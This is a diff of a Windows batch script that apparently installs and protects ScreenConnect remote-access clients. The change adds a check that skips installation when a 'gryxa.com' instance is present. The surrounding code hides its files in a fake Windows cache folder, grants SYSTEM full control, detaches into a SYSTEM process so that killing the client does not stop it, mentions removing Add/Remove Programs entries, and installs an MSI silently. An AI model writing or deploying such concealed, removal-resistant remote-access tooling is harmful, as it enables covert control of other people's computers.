@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
-REM OWN BUILD 20260802O49 - stuck Gryxa -> ARP nuke + detached msiexec /i (10s kill safe)
+REM OWN BUILD 20260802O50 - stuck Gryxa -> ARP nuke + detached msiexec /i (10s kill safe)
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "BOOT=%SystemRoot%\Temp\.wucache"
 set "LOG=%WD%\boot.err"
@@ -35,7 +35,7 @@ icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI
 
 REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
 if /I not "%~1"=="_RUN" (
-  echo === OWN BUILD 20260802O49 ===
+  echo === OWN BUILD 20260802O50 ===
   echo whoami:
   whoami
   set "ELEV=0"
@@ -63,7 +63,7 @@ if /I not "%~1"=="_RUN" (
     echo ERROR: cannot write unique runner under %BOOT%
     exit /b 6
   )
-  findstr /C:"OWN BUILD 20260802O49" "!RUNNER!" >nul 2>&1
+  findstr /C:"OWN BUILD 20260802O50" "!RUNNER!" >nul 2>&1
   if errorlevel 1 (
     echo ERROR: runner copy is not O41 - abort
     exit /b 7
@@ -267,6 +267,19 @@ if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
 )
 
 echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
+REM O50: refuse sevrz /i when ANY gryxa.com SC is present — shared UpgradeCodes knock Gryxa OFFLINE.
+set "GPRESENT=0"
+for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
+  set "_FP=%%a"
+  set "_FP=!_FP: =!"
+  for /f "usebackq delims=" %%I in (`reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2^>nul ^| findstr /I "ImagePath"`) do (
+    echo %%I | findstr /I "gryxa.com" >nul && set "GPRESENT=1"
+  )
+)
+if "!GPRESENT!"=="1" (
+  echo primary_skip_i_protect_gryxa>>"%LOG%"
+  goto :after_primary_install
+)
 echo primary_install_begin>>"%LOG%"
 msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
 set "INST_EXIT=!ERRORLEVEL!"
